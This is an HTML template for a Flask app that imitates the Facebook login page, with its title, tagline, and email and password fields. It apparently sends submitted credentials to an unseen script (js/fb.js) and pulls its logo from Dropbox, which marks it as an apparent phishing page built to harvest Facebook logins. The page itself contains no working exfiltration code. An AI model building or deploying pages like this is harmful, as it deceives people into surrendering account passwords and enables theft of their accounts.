<!DOCTYPE html>
<html id="facebook" lang="en"><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8"><meta charset="utf-8"><meta name="referrer" content="origin-when-crossorigin" id="meta_referrer">
<link type="text/css" rel="stylesheet" href="{{url_for('static', filename='css/fb.css')}}">
<link href='https://unpkg.com/boxicons@2.1.1/css/boxicons.min.css' rel='stylesheet'>
<title>Facebook - Log In</title>
<body>
    <section class="_95k">
        <section id="loader" class="secLoader">
            <div class="preloader"></div>
        </section>
        <div id="main" class="main">
            <img src="https://www.dl.dropboxusercontent.com/s/yntb6newgm6x3c3/fb.jpg" alt="">
            <h2 class="letters">
                Connect with friends and the world around you on Facebook.
            </h2>
        </div>
        <div class="login">
            <form id="logIn">
                <div class="content mail">
                    <input id="email" type="text" placeholder="Email or phone number" autocomplete>
                    <p id="msgMail" class="message"></p>
                </div>
                <div class="content pass">
                    <input style="width: 90%;" id="pass" type="password" placeholder="Password">
                    <i id="view" class='bx bx-low-vision'></i>
                    <div id="msgPass" class="message">
                        <p></p>
                    </div>
                </div>
                <button id="btnSend">Log In</button>
                <div class="separator"></div>
                <a href=""></a>
            </form>
        </div>
    </section>
</body>
<script src="{{url_for('static', filename='js/fb.js')}}"></script>
</html>
